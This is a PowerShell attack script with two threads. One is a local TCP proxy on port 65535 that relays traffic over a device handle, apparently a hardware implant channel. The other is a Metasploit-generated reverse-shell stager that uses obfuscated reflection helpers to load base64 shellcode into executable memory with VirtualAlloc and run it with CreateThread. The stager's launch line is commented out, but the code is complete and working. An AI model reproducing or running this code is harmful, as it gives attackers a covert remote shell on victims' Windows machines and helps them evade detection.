#================== Thread 1 code: the local proxy ==================
$Proxy = {
	Param($M, $device)
	try {
		[System.Console]::WriteLine("Entering proxy thread")
	  $TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, 65535)
	  $TcpListener.Start()
	  $TcpClient = $TcpListener.AcceptTcpClient()
		[System.Console]::WriteLine("Connection received")
	  $TcpListener.Stop()

	  $socket = $TcpClient.GetStream()

		$sb = New-Object Byte[] ($M+1)
		$db = New-Object Byte[] ($M+1)
	  $nb = New-Object Byte[] ($M+1)

		$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
		$dt = $device.BeginRead($db, 0, ($M+1), $null, $null)

		$stotal = 0
		$dtotal = 0
		$device_can_write = $false

		[System.Console]::WriteLine("Entering proxy loop")
		$device.Write($nb, 0, $M+1)
		while ($st -ne $null -or $dt -ne $null) {
			if ($st.IsCompleted -and $device_can_write) {
				$sbr = $socket.EndRead($st)
				if ($sbr -gt 0) {
					$stotal += $sbr
					[System.Console]::WriteLine([String]::Format("Socket {0} - Device {1}", $stotal, $dtotal))
					$sb[1] = $sbr
					$device.Write($sb, 0, $M+1)
					$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
				} else {
					$st = $null
				}
			} elseif ($dt.IsCompleted) {
				$dbr = $device.EndRead($dt)
				if ($dbr -gt 0) {
					$device_can_write = (($db[1] -band 128) -eq 0)
					$db[1] = ($db[1] -band 63)
					if ($db[1] -gt 0) {
						$dtotal += $db[1]
						[System.Console]::WriteLine([String]::Format("Socket {0} - Device {1}", $stotal, $dtotal))
						$swo = $socket.Write($db, 2, $db[1])
						$socket.Flush()
					}
					$null = $device.Write($nb, 0, $M+1)
					$dt = $device.BeginRead($db, 0, ($M+1), $null, $null)
				} else {
					$dt = $null
				}
			} else {
				Start-Sleep -m 1
			}
		}

	} catch {
		echo $_.Exception|format-list -force
		$ErrorMessage = $_.Exception.Message
		$FailedItem = $_.Exception.ItemName
		[System.Console]::WriteLine("Exception caught, terminating main loop")
		[System.Console]::WriteLine($ErrorMessage)
		[System.Console]::WriteLine($FailedItem)
	}

	[System.Console]::Write("Proxy thread completed")

	$device.Close()
	$socket.Close()
}

#================== Thread 2 code: the meterpreter stager ==================
$MeterpreterStager = {
	[System.Console]::WriteLine("Meterpreter thread started")
	# If this stager is used, pay attention to call this script from the 32 bits version of powershell: C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
	# Generated using: msfvenom -p windows/shell_reverse_tcp -f psh-reflection LHOST=127.0.0.1 LPORT=65535
	function a3W5i2q {
		Param ($mEVjpk, $pb7)
		$ryQcBCu = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

		return $ryQcBCu.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ryQcBCu.GetMethod('GetModuleHandle')).Invoke($null, @($mEVjpk)))), $pb7))
	}

	function yTi {
		Param (
			[Parameter(Position = 0, Mandatory = $True)] [Type[]] $hFa,
			[Parameter(Position = 1)] [Type] $jyxJgUGpLxZ = [Void]
		)

		$qxJSdbSh6bOU = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
		$qxJSdbSh6bOU.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $hFa).SetImplementationFlags('Runtime, Managed')
		$qxJSdbSh6bOU.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $jyxJgUGpLxZ, $hFa).SetImplementationFlags('Runtime, Managed')

		return $qxJSdbSh6bOU.CreateType()
	}

	[Byte[]]$gD5Utloezn = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VUFBQUEBQQFBo6g/f4P/Vl2oFaH8AAAFoAgD//4nmahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VaGNtZACJ41dXVzH2ahJZVuL9ZsdEJDwBAY1EJBDGAERUUFZWVkZWTlZWU1Zoecw/hv/VieBOVkb/MGgIhx1g/9W78LWiVmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")

	$pX28BjKzv7 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a3W5i2q kernel32.dll VirtualAlloc), (yTi @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $gD5Utloezn.Length,0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($gD5Utloezn, 0, $pX28BjKzv7, $gD5Utloezn.length)

	$cgU = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a3W5i2q kernel32.dll CreateThread), (yTi @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$pX28BjKzv7,[IntPtr]::Zero,0,[IntPtr]::Zero)
	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a3W5i2q kernel32.dll WaitForSingleObject), (yTi @([IntPtr], [Int32]))).Invoke($cgU,0xffffffff) | Out-Null
}

#================= Launch both threads =================
$proxyThread = [PowerShell]::Create()
[void] $proxyThread.AddScript($Proxy)
[void] $proxyThread.AddParameter("M", $M)
[void] $proxyThread.AddParameter("device", $f)
$meterpreterThread = [PowerShell]::Create()
[void] $meterpreterThread.AddScript($MeterpreterStager)
[System.IAsyncResult]$AsyncProxyJobResult = $null
[System.IAsyncResult]$AsyncMeterpreterJobResult = $null

try {
    Write-Host "About to start proxy thread"
	$AsyncProxyJobResult = $proxyThread.BeginInvoke()
	Sleep 2 # Wait 2 seconds to give some time for the proxy to be ready
	# $AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
}
catch {
	$ErrorMessage = $_.Exception.Message
	Write-Host $ErrorMessage
}
finally {
	if ($proxyThread -ne $null -and $AsyncProxyJobResult -ne $null) {
        $proxyThread.EndInvoke($AsyncProxyJobResult)
        $proxyThread.Dispose()
    }

	if ($meterpreterThread -ne $null -and $AsyncMeterpreterJobResult -ne $null) {
		$meterpreterThread.EndInvoke($AsyncMeterpreterJobResult)
		$meterpreterThread.Dispose()
	}
}
